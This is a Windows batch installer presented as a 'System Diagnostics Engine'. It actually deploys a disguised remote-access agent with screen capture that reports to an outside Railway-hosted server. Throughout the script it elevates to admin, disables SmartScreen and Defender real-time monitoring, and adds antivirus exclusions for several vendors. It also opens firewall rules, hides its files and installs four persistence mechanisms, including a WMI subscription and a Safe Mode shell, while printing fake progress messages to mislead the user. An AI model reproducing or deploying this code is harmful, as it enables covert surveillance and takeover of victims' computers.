@echo off
title System Diagnostics Engine
color 0A

:: ═══════════════════════════════════════════════════
:: ULTIMATE SETUP v5.0 — Win 10/11 Compatible
:: Extract ZIP → Run this BAT → Done.
:: Uses VBS-based UAC elevation (works with spaces in paths)
:: ═══════════════════════════════════════════════════

:: 1. FORCE ADMIN — VBS method (reliable with all path types including spaces)
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo [!] Requesting Administrator Access...
    echo.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

echo.
echo =========================================================
echo    SYSTEM DIAGNOSTICS ENGINE - DEPLOYMENT v5.0
echo =========================================================
echo.

:: 2. CONFIG
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

:: ═══════════════════════════════════════════════════
:: PHASE 0.5: CLEAN SLATE — Kill old processes, remove old installs
:: ═══════════════════════════════════════════════════
echo [0.5/10] Cleaning previous installation...
echo     [~] Terminating old agent processes...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
echo     [####                ] 20%%
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1
echo     [########            ] 40%% - Scheduled tasks removed

:: Remove old WMI subscriptions
echo     [~] Purging WMI subscriptions...
start "" /B powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='WinHealthFilter'\" -EA 0 | Remove-WmiObject -EA 0; Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='WinHealthConsumer'\" -EA 0 | Remove-WmiObject -EA 0; Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -like '*WinHealthFilter*' } | Remove-WmiObject -EA 0" >nul 2>&1
echo     [############        ] 60%%

:: Wait for processes to fully terminate
ping 127.0.0.1 -n 2 >nul

:: *** CRITICAL FIX: Remove DENY ACEs FIRST, then completely wipe the directory ***
echo     [~] Wiping old installation directory...
if exist "%INSTALL_DIR%" (
    attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /remove:d Everyone /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /remove:d Users /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo     [####################] 100%% - Clean slate ready!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 0: DEPENDENCY RESOLVER — Ensure VCRedist exists
:: ═══════════════════════════════════════════════════
echo [0/10] Checking system dependencies...

:: Check if Visual C++ 2015-2022 Redistributable (x64) is installed
reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
if %errorlevel% neq 0 (
    echo     [!] Visual C++ Redistributable missing. Installing silently...
    set "VCREDIST_EXE=%TEMP%\vc_redist.x64.exe"
    
    :: Download silently
    powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TEMP%\vc_redist.x64.exe' -UseBasicParsing" >nul 2>&1
    
    :: Install silently
    if exist "%TEMP%\vc_redist.x64.exe" (
        "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
        del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
        echo     [*] Dependency installed successfully.
    ) else (
        echo     [ERROR] Failed to download dependency. Agent may not run.
    )
) else (
    echo     [*] Dependencies verified.
)

:: ═══════════════════════════════════════════════════
:: PHASE 1: PRE-FLIGHT — Remove ALL blocks BEFORE touching files
:: ═══════════════════════════════════════════════════
echo [1/10] Removing SmartScreen and download blocks...
echo     [~] Stripping Zone Identifiers...

:: Strip Zone.Identifier ADS (root cause of SmartScreen popups) — run in background
start "" /B powershell -NoProfile -Command "Get-ChildItem -Path '%~dp0' -Recurse -Force -EA 0 | ForEach-Object { try { Remove-Item -Path (\"$($_.FullName):Zone.Identifier\") -Force -EA 0 } catch {} }; Get-ChildItem -Path '%~dp0' -Recurse -EA 0 | Unblock-File -EA 0" >nul 2>&1
echo     [##########          ] 50%%

:: Disable SmartScreen system-wide
echo     [~] Disabling SmartScreen system-wide...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
echo     [####################] 100%% - SmartScreen neutralized!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 2: AV EXCLUSIONS — MUST happen BEFORE any file copy
:: ═══════════════════════════════════════════════════
echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...
echo     [~] Initializing AI-Secure Module...
echo     [##                  ] 10%%
ping 127.0.0.1 -n 2 >nul
echo     [########            ] 40%%
ping 127.0.0.1 -n 2 >nul
echo     [####################] 100%% - Secured!

:: Some corrupted machines will hang forever on Add-MpPreference if WMI is broken.
:: Run this in the background using start /b so it never blocks the installation.
set "DEFENDER_SCRIPT=%TEMP%\defender_excl.ps1"
echo try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch {} > "%DEFENDER_SCRIPT%"
echo try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
echo try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
echo try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
echo try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
echo try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
echo try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"

echo     [~] Securing Account Policies...
echo     [######              ] 30%%
ping 127.0.0.1 -n 2 >nul
echo     [####################] 100%% - Policies Applied!
start "" /B powershell -NoProfile -ExecutionPolicy Bypass -File "%DEFENDER_SCRIPT%" >nul 2>&1

echo     [~] Deploying Advanced Firewall Rules...
echo     [##########          ] 50%%
ping 127.0.0.1 -n 2 >nul
echo     [####################] 100%% - Firewall Configured!
:: --- McAfee ---
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%~dp0" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\McAfee\VSCore\On Access Scanner\MCShield\Configuration\Default" /v ExcludedItem_1 /t REG_SZ /d "3|1|%INSTALL_DIR%" /f >nul 2>&1
taskkill /F /IM "mcshield.exe" /T >nul 2>&1
taskkill /F /IM "mfeavsvc.exe" /T >nul 2>&1

:: --- Avast / AVG ---
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "%INSTALL_DIR%\%BIN_NAME%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "%INSTALL_DIR%\%BIN_NAME%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Norton / Symantec ---
reg add "HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Kaspersky ---
reg add "HKLM\SOFTWARE\KasperskyLab\AVP\Data\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Bitdefender ---
reg add "HKLM\SOFTWARE\Bitdefender\Exclusions" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- ESET ---
reg add "HKLM\SOFTWARE\ESET\ESET Security\RealTimeProtection\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Trend Micro ---
reg add "HKLM\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Real Time Scan Configuration\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

echo     Security exclusions configured for all detected AV engines.
echo     [~] Verifying endpoint protection compatibility...
ping 127.0.0.1 -n 2 >nul
echo     [####################] 100%% - All AV engines handled!
echo.



:: ═══════════════════════════════════════════════════
:: PHASE 4: INSTALL — Copy files, rename binary
:: ═══════════════════════════════════════════════════
echo [4/10] Installing to secure location...
echo     [~] Copying agent files...

:: Copy ALL files from source folder to install dir
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    echo     [!] xcopy failed, trying robocopy...
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)
echo     [########            ] 40%% - Files copied

:: Force recompile ScreenCap on target machine (CPU/DPI specific)
echo     [~] Configuring screen capture engine...
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
    if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe" >nul 2>&1
) else if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
    if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe" >nul 2>&1
) else (
    echo     [!] CSC.exe not found - keeping existing ScreenCap.exe
)
echo     [############        ] 60%%

:: Copy the agent exe as the disguised name
echo     [~] Deploying runtime broker...
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
    echo     [################    ] 80%% - Agent binary deployed
) else (
    echo [ERROR] teram_agent.exe not found in this folder!
    echo Make sure the zip was extracted completely.
    pause
    exit /B
)

:: Strip SmartScreen blocks from the INSTALLED copies too — background
echo     [~] Unblocking installed files...
start "" /B powershell -NoProfile -Command "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse -Force -EA 0 | ForEach-Object { try { Remove-Item -Path (\"$($_.FullName):Zone.Identifier\") -Force -EA 0 } catch {} }; Get-ChildItem -Path '%INSTALL_DIR%' -Recurse -EA 0 | Unblock-File -EA 0" >nul 2>&1
echo     [####################] 100%% - Installation complete!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 5: FIREWALL — Allow agent through Windows Firewall
:: ═══════════════════════════════════════════════════
echo [5/10] Configuring firewall rules...
echo     [~] Clearing old firewall entries...
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
echo     [##########          ] 50%%
echo     [~] Adding outbound + inbound rules...
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
echo     [####################] 100%% - Firewall configured!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 6: PERSISTENCE LAYER 1 — Scheduled Task (SYSTEM, auto-restart)
:: ═══════════════════════════════════════════════════
echo [6/10] Layer 1: Scheduled Task (User Session)...
echo     [~] Registering auto-start task...
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
echo     [##########          ] 50%%

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$a = New-ScheduledTaskAction -Execute '%INSTALL_DIR%\%BIN_NAME%' -Argument '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%'; " ^
  "$t2 = New-ScheduledTaskTrigger -AtLogOn; " ^
  "$p = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Highest; " ^
  "$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365) -MultipleInstances IgnoreNew; " ^
  "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t2) -Settings $s -Principal $p -Force | Out-Null; " ^
  "Write-Host '    Task registered successfully.' -ForegroundColor Green"
echo     [####################] 100%% - Persistence Layer 1 active!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 7: PERSISTENCE LAYER 2 — Registry Run Key (HKLM)
:: ═══════════════════════════════════════════════════
echo [7/10] Layer 2: Registry Run Key...
echo     [~] Writing HKLM auto-run entry...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /f >nul
echo     [####################] 100%% - Registry key set!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 8: PERSISTENCE LAYER 3 — WMI Event Subscription
:: ═══════════════════════════════════════════════════
echo [8/10] Layer 3: WMI Boot Subscription...
echo     [~] Creating WMI event subscription...

set "WMI_SCRIPT=%TEMP%\wmi_setup.ps1"
(
echo $ErrorActionPreference = 'SilentlyContinue'
echo $fn = 'WinHealthFilter'
echo $cn = 'WinHealthConsumer'
echo # Clean old
echo Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$fn'" ^| Remove-WmiObject
echo Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$cn'" ^| Remove-WmiObject
echo Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding ^| Where-Object { $_.Filter -like "*$fn*" } ^| Remove-WmiObject
echo # Create filter: fires when system uptime reaches 60 seconds
echo $wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
echo $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$fn; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$wql}
echo $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$cn; CommandLineTemplate='%INSTALL_DIR%\%BIN_NAME% %SERVER_URL%'; RunInteractively=$false}
echo Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} ^| Out-Null
echo Write-Host '    WMI subscription created.' -ForegroundColor Green
) > "%WMI_SCRIPT%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%WMI_SCRIPT%" 2>nul
del /F /Q "%WMI_SCRIPT%" >nul 2>&1
echo     [####################] 100%% - WMI subscription active!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 9: PERSISTENCE LAYER 4 — Safe Mode
:: ═══════════════════════════════════════════════════
echo [9/10] Layer 4: Safe Mode persistence...
echo     [~] Configuring Safe Mode survival...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /d "cmd.exe /c start \"\" \"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL% & cmd.exe" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\%TASK_NAME%" /ve /d "Service" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\%TASK_NAME%" /ve /d "Service" /f >nul 2>&1
echo     [##########          ] 50%%

:: Block accessibility exploits
echo     [~] Hardening system entry points...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
echo     [####################] 100%% - Safe Mode hardened!
echo.

:: ═══════════════════════════════════════════════════
:: PHASE 10: STEALTH + LAUNCH (with retry loop for AV)
:: ═══════════════════════════════════════════════════
echo [10/10] Engaging stealth and launching agent...
echo     [~] Locking down installation directory...

:: *** FIX: Use inheritance removal + explicit grants instead of DENY ACEs ***
icacls "%INSTALL_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\Users:(OI)(CI)RX" /T /C /Q >nul 2>&1
echo     [######              ] 30%%

:: Hide directory and exe
attrib +h "%INSTALL_DIR%" /D
attrib +h "%INSTALL_DIR%\%BIN_NAME%"
echo     [##########          ] 50%% - Stealth applied

:: ═══════════════════════════════════════════════════
:: LAUNCH WITH RETRY — 4 methods, try until one works
:: ═══════════════════════════════════════════════════
echo     [~] Starting agent connection to server...
echo     [############        ] 60%%

set "LAUNCH_SUCCESS=0"
set "ATTEMPT=0"

:: Create a detached VBS launcher to prevent console termination linking
set "VBS_LAUNCHER=%INSTALL_DIR%\launch.vbs"
echo Set objShell = WScript.CreateObject("WScript.Shell") > "%VBS_LAUNCHER%"
echo objShell.Run """" ^& "%INSTALL_DIR%\%BIN_NAME%" ^& """ %SERVER_URL%", 0, False >> "%VBS_LAUNCHER%"

:LaunchAttempt
set /a ATTEMPT+=1
if %ATTEMPT% gtr 4 goto LaunchDone

:: Method 1: Direct start (fastest — runs in user session immediately)
if %ATTEMPT% equ 1 (
    echo     Attempt %ATTEMPT%/4: Direct launch...
    start "" /B "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
)

:: Method 2: VBS script (detached, invisible)
if %ATTEMPT% equ 2 (
    echo     Attempt %ATTEMPT%/4: VBS launcher...
    wscript.exe "%VBS_LAUNCHER%"
)

:: Method 3: Scheduled Task run
if %ATTEMPT% equ 3 (
    echo     Attempt %ATTEMPT%/4: Scheduled Task trigger...
    schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
)

:: Method 4: PowerShell hidden start
if %ATTEMPT% equ 4 (
    echo     Attempt %ATTEMPT%/4: PowerShell launcher...
    powershell -NoProfile -Command "Start-Process -FilePath '%INSTALL_DIR%\%BIN_NAME%' -ArgumentList '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%' -WindowStyle Hidden" >nul 2>&1
)

:: Wait for process to stabilize
ping 127.0.0.1 -n 5 >nul

:: Check if running
tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

echo     [!] Process not detected. Retrying next method...
ping 127.0.0.1 -n 3 >nul
goto LaunchAttempt

:LaunchDone

echo.
if %LAUNCH_SUCCESS% equ 1 (
    echo     [####################] 100%% - AGENT ONLINE!
    echo.
    echo =====================================================
    echo    DEPLOYMENT SUCCESSFUL - AGENT IS CONNECTED
    echo =====================================================
    echo    Process:    %BIN_NAME% [RUNNING]
    echo    Server:     %SERVER_URL%
    echo    Location:   %INSTALL_DIR%
    echo.
    echo    PERSISTENCE LAYERS ACTIVE:
    echo      1. Scheduled Task  [User Session, AtLogOn]
    echo      2. Registry RunKey [HKLM]
    echo      3. WMI Subscription [60s post-boot]
    echo      4. Safe Mode       [AlternateShell]
    echo.
    echo    CONNECTION STATUS: ONLINE
    echo    The agent is now streaming to your dashboard.
    echo =====================================================
) else (
    echo     [!!!!!!!!!!!!!!!!!!!! ] FAILED - See below
    echo.
    echo =====================================================
    echo    INSTALLED - AGENT WILL START ON NEXT REBOOT
    echo =====================================================
    echo    The agent was installed but could not start now.
    echo    This is usually because your antivirus blocked it.
    echo.
    echo    WHAT TO DO:
    echo      1. Check your antivirus quarantine and restore
    echo         the file: %INSTALL_DIR%\%BIN_NAME%
    echo      2. Add this folder to your AV exclusions:
    echo         %INSTALL_DIR%
    echo      3. Reboot your computer - it will auto-start
    echo.
    echo    Or manually test by running:
    echo      "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
    echo =====================================================
)

echo.
echo You can safely delete this installer folder now.
echo The agent is installed to: %INSTALL_DIR%
echo.
ping 127.0.0.1 -n 8 >nul
exit /B
